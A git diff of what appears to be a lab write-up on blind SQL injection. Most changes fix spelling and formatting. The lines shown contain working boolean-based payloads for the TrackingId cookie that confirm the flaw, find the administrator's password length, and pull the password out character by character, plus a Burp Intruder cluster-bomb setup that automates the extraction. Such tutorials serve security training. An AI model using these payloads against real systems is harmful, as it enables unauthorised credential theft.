@@ -13,8 +13,8 @@ The database contains a different table called users, with columns called userna
 
 
 ## Solution
-**Alter the cookie and confirm SQLi**
-- Capture the request in burp suit and use the following payloads on the **TrackingId** cookie and observe the response
+- Alter the cookie and confirm SQLi
+    - Capture the request in burp suit and use the following payloads on the **TrackingId** cookie and observe the response
     - ``` ' AND '1'='1 ```
         1=1 means the condition is true and returns **Welcome Back** message in the response
     - ``` ' AND '1'='2 ```
@@ -32,24 +32,24 @@ The database contains a different table called users, with columns called userna
         The query retrieves value from the users table only if there is a user with the username ``` administrator ``` is present. If the request responds with a **Welcome Back** message that confirms the presence of the ``` administrator ``` user.
 
 
-- Find the number of charectors in the **password** for the **administrator**
+- Find the number of characters in the **password** for the **administrator**
     - Use the payload ``` ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a ```
         - The query checks whether the ``` administrator ``` user has a password length greater than 1 character. If the condition is true, the subquery returns the fixed value ``` 'a' ```, making the comparison **TRUE**, and return with a **Welcome Back** message.
     
     - Change the value **1** untill get a response without **Welcome Back** message.
 
-    - ``` ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a ``` The payload with value **20** returns the response without a **Welcome Back** message. There is **20 Charecters in the password**
+    - ``` ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a ``` The payload with value **20** returns the response without a **Welcome Back** message. There is **20 character in the password**
 
 
 - Retrieve the Password
     ``` ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a ```
-    - The payload retrieves a single charector from the administrator password and compare with the charector ``` 'a ```, if both matches then condition becomes True and returns with the **Welcome Back** message otherwise without the message.
+    - The payload retrieves a single character from the administrator password and compare with the character ``` 'a ```, if both matches then condition becomes True and returns with the **Welcome Back** message otherwise without the message.
 
     - Send the request to **Intruder** and select the **Cluster bombing attack**
     
-    - Select index position 1 from ``` (password,1,1) ``` and click the **Add §** for select position 1, select the charector ``` a ``` and click **Add §** for select position 2. The payload will look like the following
+    - Select index position 1 from ``` (password,1,1) ``` and click the **Add §** for select position 1, select the character ``` a ``` and click **Add §** for select position 2. The payload will look like the following
     ``` ' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§ ```
 
     - Configure the payload **position 1** to **1-20** and payload **position 2** to **0-1** also **a-z**, Start the attack
 
-    - Check for the responses with **Welcome Back** message and retrive the charectors that replaced in the payload **position 2** combine all the charectors will give the password
+    - Check for the responses with **Welcome Back** message and retrive the characters that replaced in the payload **position 2** in the order of 1 - 20 from the payload position 1, combine all the characters will give the password of ``` administrator ```
